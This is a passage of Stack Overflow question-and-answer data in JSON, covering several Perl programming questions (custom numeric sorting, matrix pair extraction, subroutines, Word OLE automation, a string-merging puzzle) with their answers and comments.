.I tested for this case:01,02,04,06,07,91,95,99 it gave me below answer Splicing on 6 99,1,2,4,6,7,91,95"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "reply_to_user": {"reputation": 65, "user_id": 5542580, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dacd1ccbe36d795fc75ed15c79ce16e5?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5542580/nithin"}, "edited": false, "score": 0, "creation_date": 1447079022, "post_id": 33611041, "comment_id": 54996649, "body": "This works, but it doesn&#39;t work exhaustively - with numbers in sequence it&#39;s easy to detect a break. With numbers that <i>aren&#39;t</i> it&#39;s quite hard to tell where the break should be."}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1447079650, "post_id": 33611041, "comment_id": 54997007, "body": "@Sobrique You probably should not sort numbers in alphabetic order, even if it does happen to work with this data."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447079765, "post_id": 33611041, "comment_id": 54997080, "body": "Good point. Amended."}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1447079734, "last_edit_date": 1447079734, "creation_date": 1447078359, "answer_id": 33611041, "question_id": 33610566, "link": "https://stackoverflow.com/questions/33610566/sorting-in-perl-in-a-particular-way/33611041#33611041", "title": "Sorting in perl in a particular way", "body": "<p>I'm guessing based in your data, that your numbers are sequential, but wrapping around 100. So you would find the 'start' by ordering everything, then looking for the gap. (This breaks if you have a complete cycle though!)</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy @numbers = ( 1,2,3,4,5,97,98,99 ); \n\n#sort them\nmy @sorted = sort { $a &lt;=&gt; $b } @numbers;\n\n#rotate the numbers until your 'gap' is off the end of the cycle. \n\nmy $splice = 0; \nfor ( my $index = 0; $index &lt; $#numbers; $index++ ) {\n    print 1+$sorted[$index]  % 100,\",\";\n    print $sorted[$index+1] % 100,\"\\n\";\n    if ( ($sorted[$index] + 1 ) %100 &lt; $sorted[$index+1] % 100 ) { \n        $splice = $index;\n    }\n}\nprint \"Splicing on $splice\\n\";\n@numbers = ( splice ( @sorted, $splice+1, @sorted - $splice ), splice ( @sorted, 0, $splice+1 ) );\nprint join \",\", @numbers;\n</code></pre>\n\n<p>Edit: OK, new test cases. Might not work for those. Hopefully this illustrates an approach. But with gaps in your ordering (I have assumed no gaps) it's very hard to tell because you're basically looking for the biggest gap. </p>\n"}], "owner": {"reputation": 65, "user_id": 5542580, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/dacd1ccbe36d795fc75ed15c79ce16e5?s=128&d=identicon&r=PG&f=1", "display_name": "nithin", "link": "https://stackoverflow.com/users/5542580/nithin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "closed_date": 1447078622, "answer_count": 2, "score": -1, "last_activity_date": 1447080192, "creation_date": 1447076806, "last_edit_date": 1447080192, "question_id": 33610566, "link": "https://stackoverflow.com/questions/33610566/sorting-in-perl-in-a-particular-way", "closed_reason": "Needs details or clarity", "title": "Sorting in perl in a particular way", "body": "<p>I am writing a program in Perl. A part of it requires sorting of numbers. But it's not a normal sorting. The values are something like this. <code>01,02,03,04,05,97,98,99</code>. I want it to be sorted like this.</p>\n\n<pre><code>97\n98\n99\n01\n02\n03\n04\n05\n</code></pre>\n\n<p>We are sorting data packets. If yesterday the last data pack was 96, today it will start from 97 and will go on till 99 then comes back to 01 02 ....and would stop at some number say 06. </p>\n"}, {"tags": ["perl", "matrix", "hash"], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": true, "score": 1, "last_activity_date": 1447077073, "creation_date": 1447077073, "answer_id": 33610646, "question_id": 33610332, "link": "https://stackoverflow.com/questions/33610332/obtain-pairs-from-a-matrix-in-perl/33610646#33610646", "title": "Obtain pairs from a matrix in Perl", "body": "<p>Guessing your algorithm based on output - this seems to do the trick. I'm not sure if I'm missing something, or if you're going around the houses a bit. You don't seem to actually need your complex data structures. </p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\n#magic filehandle - reads piped STDIN or files on command line. \nwhile (&lt;&gt;) {\n    #split current line on whitespace\n    my ( $key, @fields ) = split;\n    my $count = 1;\n    #iterate each field on the current line, printing a key and a count. \n    foreach my $field (@fields) {\n        print join( \" \", $key, $count++, $field ), \"\\n\";\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 5183625, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c3568ea2b76a30bb701e3a49eace2768?s=128&d=identicon&r=PG&f=1", "display_name": "cmvdi01", "link": "https://stackoverflow.com/users/5183625/cmvdi01"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "accepted_answer_id": 33610646, "answer_count": 1, "score": 0, "last_activity_date": 1447077073, "creation_date": 1447076142, "question_id": 33610332, "link": "https://stackoverflow.com/questions/33610332/obtain-pairs-from-a-matrix-in-perl", "title": "Obtain pairs from a matrix in Perl", "body": "<p>I have several files with lower triangular matrices with different dimensions and I'm trying to obtain the row/column pairs for each value.</p>\n\n<pre><code>File:\n\n2  0.0158           \n3  0.0079 0.0079           \n4  0.0000 0.0158 0.0079           \n5  0.0158 0.0317 0.0238 0.0158           \n6  0.0079 0.0238 0.0158 0.0079 0.0238           \n7  0.0079 0.0079 0.0158 0.0079 0.0238 0.0158           \n\nExpected output:\n\n2  1  0.0158           \n3  1  0.0079\n3  2  0.0079           \n4  1  0.0000\n4  2  0.0158\n4  3  0.0079           \n5  1  0.0158\n5  2  0.0317\n5  3  0.0238\n5  4  0.0158           \n6  1  0.0079\n6  2  0.0238\n6  3  0.0158\n6  4  0.0079\n6  5  0.0238           \n7  1  0.0079\n7  2  0.0079\n7  3  0.0158\n7  4  0.0079\n7  5  0.0238\n7  6  0.0158\n</code></pre>\n\n<p>This is what I've tried, but I can't get the correct output.\nAny help is much appreciated.</p>\n\n<pre><code>    use strict;\n    use warnings;\n\n    open (my $IN , '&lt;', $ARGV[0]) or die \"$!\";\n\n    # declare variables\n\nwhile (my $line = &lt;$IN&gt;) {\n    foreach ($line) {\n    push @file, $line;                                                                                                                                                                                      \n                }\n        }\n    $line = '';\n\n    foreach $line (@file) {\n             if ($line =~ /(\\d{1,2})/)   {\n                     $index = $1; \n                     @values = split( /\\s{2,2}/, $line );\n                     foreach $value (@values) {\n                     if ($value =~ /\\d\\.\\d+/)   {\n                     @sub_values = split( /\\s/, $value );\n                             foreach $sub_value (@sub_values) {\n                             push @{$Matrix{$index}}, $sub_value;   \n                             }\n                         }\n                     }               \n                 }   \n             }\n\n    foreach $group (keys %Matrix) {          \n                    @sequence = (1..$group-1);\n                            foreach $seq (@sequence) {\n                                    foreach (@{$Matrix{$group}}) {\n                                    push @{$Extra{$group}{$seq}}, $_;                       \n                                    }\n                                }\n                            }    \n\n    foreach $group1 (keys %Extra) {\n            foreach $seq1 (keys %{$Extra{$group1}}) {\n                    foreach $innermost (@{$Extra{$group1}{$seq1}}) {\n                    if ($innermost =~ /\\d\\.\\d+/)   {\n                    print $group1,\"\\t\",$seq1,\"\\t\",$innermost,\"\\n\";\n                                            }\n                                        }\n                                    }\n                                }\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 2, "creation_date": 1447075546, "post_id": 33610047, "comment_id": 54994546, "body": "Please refer to the tutorials in the Perl tag-wiki here on SO. There are a lot of good ressources there. As for my personal advice, you can probably not decide what you want to learn or what you feel comfortable with just by implementing a simple selection such as this."}, {"owner": {"reputation": 1485, "user_id": 5388516, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/96fff619864c3ebb7654eb98bd945b43?s=128&d=identicon&r=PG&f=1", "display_name": "13aal", "link": "https://stackoverflow.com/users/5388516/13aal"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1447075631, "post_id": 33610047, "comment_id": 54994608, "body": "Thanks for the advice, I&#39;ll look into it"}], "answers": [{"tags": [], "owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "is_accepted": true, "score": 3, "last_activity_date": 1447075745, "creation_date": 1447075745, "answer_id": 33610202, "question_id": 33610047, "link": "https://stackoverflow.com/questions/33610047/writing-ruby-script-in-perl/33610202#33610202", "title": "Writing Ruby Script In Perl", "body": "<p>You don't seem to be doing anything OO in that code, so a method seems like overkill. It would be more usual to use a simple <a href=\"http://perldoc.perl.org/functions/sub.html\" rel=\"nofollow\">subroutine</a>.</p>\n\n<pre><code>sub welcome {\n    ...\n}\nwelcome();\n</code></pre>\n\n<p>If you really wanted to use a method, then <a href=\"http://perldoc.perl.org/perlootut.html\" rel=\"nofollow\">perlootut</a> is the classic method. A lot of people write OO code using <a href=\"https://metacpan.org/pod/Moose\" rel=\"nofollow\">Moose</a> these days though. </p>\n\n<p>It still comes down to writing a sub though, just one placed in the middle of a package definition instead of a simple script.</p>\n"}, {"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 0, "last_activity_date": 1447075757, "last_edit_date": 1495541756, "creation_date": 1447075757, "answer_id": 33610210, "question_id": 33610047, "link": "https://stackoverflow.com/questions/33610047/writing-ruby-script-in-perl/33610210#33610210", "title": "Writing Ruby Script In Perl", "body": "<p>In Perl, not everything is automatically an object, so there are no methods per se. Functions are called subroutines, or <strong>sub</strong>. You can create one with the <code>sub</code> keyword.</p>\n\n<pre><code>sub foo {\n  # ...\n}\n</code></pre>\n\n<p>You call it by using the identifier. In our example that's:</p>\n\n<pre><code>foo();\n</code></pre>\n\n<p>For more details, please see the various ressources linked in the <a href=\"/questions/tagged/perl\" class=\"post-tag\" title=\"show questions tagged &#39;perl&#39;\" rel=\"tag\">perl</a> [tag wiki]<a href=\"https://stackoverflow.com/tags/perl/info\">1</a>, or check <a href=\"http://perldoc.perl.org/perlsub.html\" rel=\"nofollow noreferrer\">perlsub</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 205702, "user_id": 7552, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b60298053f87465641c1b1192338c8cd?s=128&d=identicon&r=PG", "display_name": "glenn jackman", "link": "https://stackoverflow.com/users/7552/glenn-jackman"}, "is_accepted": false, "score": 1, "last_activity_date": 1447076594, "creation_date": 1447076594, "answer_id": 33610494, "question_id": 33610047, "link": "https://stackoverflow.com/questions/33610047/writing-ruby-script-in-perl/33610494#33610494", "title": "Writing Ruby Script In Perl", "body": "<p>With perl, variables have \"sigils\" to determine their \"type\":</p>\n\n<pre><code>my $scalar = \"a scalar value\";\nmy @array = ('a', 'list', 'of', 'scalar', 'values');\nmy %hash = (key1 =&gt; \"value1\", key2 =&gt; \"value2\");\n</code></pre>\n\n<p>See <a href=\"http://perldoc.perl.org/perldata.html\" rel=\"nofollow\">perldoc perldata</a>.</p>\n\n<p>Starting from perl version 5.10, there is an optional <code>say</code> command available. It is the equivalent to ruby's <code>puts</code>.</p>\n\n<pre><code>use feature qw(say);\nsay \"I get a newline automatically.\";\n</code></pre>\n\n<p>See <a href=\"http://perldoc.perl.org/feature.html\" rel=\"nofollow\">perldoc feature</a>.</p>\n\n<p>And to find the length of an array</p>\n\n<pre><code>my $num = scalar @choices;   # or,\nmy $num = @choices;\n</code></pre>\n\n<p>A random element of an array:</p>\n\n<pre><code>my $rand_elem = $choices[rand @choices];\n</code></pre>\n"}], "owner": {"reputation": 1485, "user_id": 5388516, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/96fff619864c3ebb7654eb98bd945b43?s=128&d=identicon&r=PG&f=1", "display_name": "13aal", "link": "https://stackoverflow.com/users/5388516/13aal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 97, "favorite_count": 0, "accepted_answer_id": 33610202, "answer_count": 3, "score": 0, "last_activity_date": 1447076594, "creation_date": 1447075232, "question_id": 33610047, "link": "https://stackoverflow.com/questions/33610047/writing-ruby-script-in-perl", "title": "Writing Ruby Script In Perl", "body": "<p>I'm writing a simple script in three different languages, Python, Ruby, and Perl. I'm extremely new to Perl, but really want to learn it. My problem being, I don't know how to write a method in Perl like in Ruby. I'm pretty sure that a method is called a function in Perl, but I'm not exactly sure..</p>\n\n<p>Here's what I'm writing in the three languages:\nRuby(all I have so far)</p>\n\n<pre><code>=begin \nTest program to choose language\nRuby\ncreator Me\n=end\n\ndef welcome\n    choices = %w(Perl Python Ruby)\n    lang = 3\n    puts \"Welcome, to the test script, this will test what language you would like to learn.. In order to find out these choices, write this same definition in all three different languages\"\n    puts \"There are\", lang, \"languages to choose from please choose one:\"\n    print choices\n    print \"&gt;\\t\"\n    input = gets.chomp\n    if input =~ /perl/i\n        puts \"You have chosen Perl!\"\n    elsif input =~ /python/i\n        puts \"You have chosen Python!\"\n    else\n        puts \"You're already writing in Ruby!! Let me choose for you:\"\n        print \"#{choices.sample}\\n\"\n    end\nend\nwelcome\n</code></pre>\n\n<p>As you can see this is a very simple script, I just feel as though writing it in three different languages will help me choose which one I want to learn next( I already know Ruby ).</p>\n\n<p>Can someone explain to me how to write a method in Perl please? I've googled it but I can't seem to get anywhere with \"method in Perl\" It'd be greatly appreciated thank you ahead of time.</p>\n"}, {"tags": ["perl", "ole"], "comments": [{"owner": {"reputation": 2166, "user_id": 285364, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/69d9207065febf40940eb74a3b76222e?s=128&d=identicon&r=PG", "display_name": "Vladimir Alexiev", "link": "https://stackoverflow.com/users/285364/vladimir-alexiev"}, "edited": false, "score": 0, "creation_date": 1447070333, "post_id": 33608591, "comment_id": 54991809, "body": "<a href=\"http://www.xav.com/perl/site/lib/Win32/OLE/Browser/Browser.html\" rel=\"nofollow noreferrer\">xav.com/perl/site/lib/Win32/OLE/Browser/Browser.html</a> in Chrome shows empty frames, just some script source at the bottom"}], "answers": [{"tags": [], "owner": {"reputation": 2166, "user_id": 285364, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/69d9207065febf40940eb74a3b76222e?s=128&d=identicon&r=PG", "display_name": "Vladimir Alexiev", "link": "https://stackoverflow.com/users/285364/vladimir-alexiev"}, "is_accepted": false, "score": 2, "last_activity_date": 1447080687, "creation_date": 1447080687, "answer_id": 33611779, "question_id": 33608591, "link": "https://stackoverflow.com/questions/33608591/ole-automation-with-perl-in-2015/33611779#33611779", "title": "OLE Automation with Perl in 2015", "body": "<p>Although GetObject doesn't work for me, Win32::OLE->new('Word.Application') worked, and I was able to do the job with a script like this</p>\n\n<pre><code>use Win32::OLE; # http://search.cpan.org/~jdb/Win32-OLE-0.1712/lib/Win32/OLE.pm\nuse Win32::OLE::Variant; # http://search.cpan.org/~jdb/Win32-OLE-0.1712/lib/Win32/OLE/Variant.pm\nuse constant true  =&gt; Variant-&gt;new(VT_BOOL, 'true');\nuse constant false =&gt; Variant-&gt;new(VT_BOOL, 'false');\n\nuse Cwd;\n# use Path::Abstract qw(path); # http://search.cpan.org/~rokr/Path-Abstract-0.096/lib/Path/Abstract.pm#$path-&gt;extension\nuse constant MAX =&gt; 1024000; # max file size to open\n\n# https://msdn.microsoft.com/en-us/library/office/ff839952.aspx\nuse constant wdFormatUnicodeText =&gt; 7;\nuse constant wdFormatFilteredHTML =&gt; 10;\n# use Win32::OLE::Const '.*Microsoft Word'; # http://search.cpan.org/~jdb/Win32-OLE-0.1712/lib/Win32/OLE/Const.pm\n# No type library matching \".*Word\" found at -e line 1.\n# Win32::OLE(0.1712): GetOleTypeLibObject() Not a Win32::OLE::TypeLib object at C:/Perl64/lib/Win32/OLE/Const.pm line 49.\n\nmy $w = Win32::OLE-&gt;new('Word.Application');\n# https://msdn.microsoft.com/en-us/library/aa171814(v=office.11).aspx\n$w-&gt;ChangeFileOpenDirectory(cwd);\nfor my $doc (&lt;doc/*&gt;) {\n  next if -s $doc &gt; MAX;\n  my $html = $doc; $html =~ s{\\bdocx?\\b}{html}g;\n  my $txt  = $doc; $txt  =~ s{\\bdocx?\\b}{txt}g;\n  # https://msdn.microsoft.com/EN-US/library/office/ff835182.aspx\n  $d = $w-&gt;Documents-&gt;Open ($doc, {ConfirmConversions =&gt; false, ReadOnly =&gt; true, OpenAndRepair =&gt; false, AddToRecentFiles =&gt; false, Visible =&gt; false});\n  # https://msdn.microsoft.com/en-us/library/office/ff836084.aspx\n  $d-&gt;SaveAs2({FileName =&gt; $html, FileFormat =&gt; wdFormatFilteredHTML});\n  $d-&gt;SaveAs2({FileName =&gt; $txt,  FileFormat =&gt; wdFormatUnicodeText});\n  # https://msdn.microsoft.com/EN-US/library/office/ff196343.aspx\n  $d-&gt;Close;\n  last;\n}\n</code></pre>\n"}], "owner": {"reputation": 2166, "user_id": 285364, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/69d9207065febf40940eb74a3b76222e?s=128&d=identicon&r=PG", "display_name": "Vladimir Alexiev", "link": "https://stackoverflow.com/users/285364/vladimir-alexiev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 921, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1447080687, "creation_date": 1447070257, "question_id": 33608591, "link": "https://stackoverflow.com/questions/33608591/ole-automation-with-perl-in-2015", "title": "OLE Automation with Perl in 2015", "body": "<p>I'm trying to open a Word docx file from Perl, then save it as HTML. I got Win7 63bit and Office 15 (Office 365 subscription). I read a few examples and tried with <a href=\"http://strawberryperl.com/\" rel=\"nofollow\">Strawberry</a> and <a href=\"http://www.activestate.com/activeperl/downloads\" rel=\"nofollow\">ActiveState</a> but I always get errors</p>\n\n<pre><code>perl -MWin32::OLE -e \"$wd = Win32::OLE-&gt;GetObject('1994.62_01_fnd_en.docx'); print Win32::OLE-&gt;LastError\"\nWin32::OLE(0.1712) error 0x80004005: \"Unspecified error\"\n\nperl -e \"use Win32::OLE::Const('.*Word.*')\"\nNo type library matching \".*Word.*\" found at -e line 1.\nWin32::OLE(0.1712): GetOleTypeLibObject() Not a Win32::OLE::TypeLib object at C:/Perl64/lib/Win32/OLE/Const.pm line 49.\n</code></pre>\n"}, {"tags": ["string", "algorithm", "perl"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447067760, "post_id": 33607163, "comment_id": 54990381, "body": "It is preferable to include a summary of the thing you&#39;re trying to solve - otherwise your answer is reliant on that link, which is bad news if it ever disappears."}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447068300, "post_id": 33607163, "comment_id": 54990696, "body": "@Sobrique added summary and Input/Output."}, {"owner": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 2, "creation_date": 1447073986, "post_id": 33607163, "comment_id": 54993684, "body": "I haven&#39;t got time to figure out what the problem is, but it&#39;s quite easy to find test cases that your code fails on. For example, the strings <code>AABAC</code> and <code>AACAB</code> give different results depending on the order in which they are presented."}, {"owner": {"reputation": 30659, "user_id": 1210053, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/8cee821e7bf4acaa7f0de12d603b9f1d?s=128&d=identicon&r=PG", "display_name": "Nico Schertler", "link": "https://stackoverflow.com/users/1210053/nico-schertler"}, "edited": false, "score": 1, "creation_date": 1447075218, "post_id": 33607163, "comment_id": 54994358, "body": "I don&#39;t know Perl. Do you compare the entire remaining string or just the current character? You should definitely do the former."}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "reply_to_user": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 0, "creation_date": 1447081043, "post_id": 33607163, "comment_id": 54997925, "body": "@squeamishossifrage It fails when both characters from strings are equal and <i>It fails because it removes characters from different string depending on user input and I am not sure from which string I should remove the character if they are equal</i>"}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1447085336, "post_id": 33607163, "comment_id": 55000834, "body": "@ikegami testcases are too big to analyze it manually. anyways for  this it fails <a href=\"https://hr-testcases-us-east-1.s3.amazonaws.com/2335/input01.txt?AWSAccessKeyId=AKIAJAMR4KJHHUS76CYQ&amp;Expires=1447091929&amp;Signature=Dk9yixAhZFMADlbkXQeEHe6u6YA%3D&amp;response-content-type=text%2Fplain\" rel=\"nofollow noreferrer\">input</a> and <a href=\"https://hr-testcases-us-east-1.s3.amazonaws.com/2335/output01.txt?AWSAccessKeyId=AKIAJAMR4KJHHUS76CYQ&amp;Expires=1447091944&amp;Signature=CQK12QdpUW6SoyP65JDTxXJszk8%3D&amp;response-content-type=text%2Fplain\" rel=\"nofollow noreferrer\">output</a>"}], "answers": [{"comments": [{"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447085993, "post_id": 33613184, "comment_id": 55001207, "body": "<code>since the first match Z will be le Z.</code> may you please explain it more?"}, {"owner": {"reputation": 46, "user_id": 5523845, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0fb7a3c13630a067409180dd4998affc?s=128&d=identicon&r=PG&f=1", "display_name": "Jon", "link": "https://stackoverflow.com/users/5523845/jon"}, "reply_to_user": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 1, "creation_date": 1447086293, "post_id": 33613184, "comment_id": 55001403, "body": "I can comment my own posts so sure: in your code you&#39;re having the two first characters and they are both Z. You&#39;re doing le (alpha equivalent of &lt;=)  so it&#39;ll always pick the first of the two strings as the preferred one. However that&#39;s only the reason why you&#39;re getting different result for different order. The real problem is that you don&#39;t look forward. You need if ($str1 eq $str2) { continue comparing substrings until you see which path is shortest }, your current if/else isn&#39;t enough"}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447086495, "post_id": 33613184, "comment_id": 55001539, "body": "Thank you @jon It took me a whole day to understand this."}], "tags": [], "owner": {"reputation": 46, "user_id": 5523845, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0fb7a3c13630a067409180dd4998affc?s=128&d=identicon&r=PG&f=1", "display_name": "Jon", "link": "https://stackoverflow.com/users/5523845/jon"}, "is_accepted": false, "score": 1, "last_activity_date": 1447085614, "last_edit_date": 1447085614, "creation_date": 1447084967, "answer_id": 33613184, "question_id": 33607163, "link": "https://stackoverflow.com/questions/33607163/perl-morgan-and-a-string/33613184#33613184", "title": "Perl Morgan and a String?", "body": "<p>Too little rep to comment thus the answer:</p>\n\n<p>What you need to do is to look ahead if the two characters match. You currently do a simple le match and in the case of</p>\n\n<pre><code>ZABB\nZAAA\n</code></pre>\n\n<p>You'll get ZABBZAA since the first match Z will be le Z. So what you need to do (a naive solution which most likely won't be very effective) is to keep looking as long as the strings/chars match so:</p>\n\n<pre><code>Z eq Z\nZA eq ZA\nZAB gt ZAA\n</code></pre>\n\n<p>and at that point will you know that the second string is the one you want to pop from for the first character.</p>\n\n<p><strong>Edit</strong>\nYou updated with sorting the strings, but like I wrote you still need to look ahead. The sorting will solve the two above strings but will fail with these two:</p>\n\n<pre><code>ZABAZA\nZAAAZB\nZAAAZBZABAZA\n</code></pre>\n\n<p>Because here the correct answer is ZAAAZABAZAZB and you can't find that will simply comparing character per character</p>\n"}, {"comments": [{"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447085797, "post_id": 33613409, "comment_id": 55001099, "body": "check the update I am selecting <code>smaller string lexicographically</code> after sorting them."}, {"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": "https://stackoverflow.com/users/1604311/arunesh-singh"}, "edited": false, "score": 0, "creation_date": 1447086130, "post_id": 33613409, "comment_id": 55001281, "body": "Thank you very much @ikegami I got it Thanks a million times."}, {"owner": {"reputation": 4197, "user_id": 2835239, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/7606cc48f5bb916fe2f398dbce0317fa?s=128&d=identicon&r=PG", "display_name": "Yevgen Kulik", "link": "https://stackoverflow.com/users/2835239/yevgen-kulik"}, "edited": false, "score": 0, "creation_date": 1448049045, "post_id": 33613409, "comment_id": 55435084, "body": "Actually in conditions we have limitation. &quot;He can take a letter from a collection when it is on the top of the stack. &quot; So Solution shouldn&#39;t use any CACHE. Otherwise we have wrong task setup!!! By using $str1 le $str2 you are comparing whole strings, not just last char, like in STACK"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 4197, "user_id": 2835239, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/7606cc48f5bb916fe2f398dbce0317fa?s=128&d=identicon&r=PG", "display_name": "Yevgen Kulik", "link": "https://stackoverflow.com/users/2835239/yevgen-kulik"}, "edited": false, "score": 0, "creation_date": 1448051864, "post_id": 33613409, "comment_id": 55436604, "body": "@Yevgen Kulik, That&#39;s 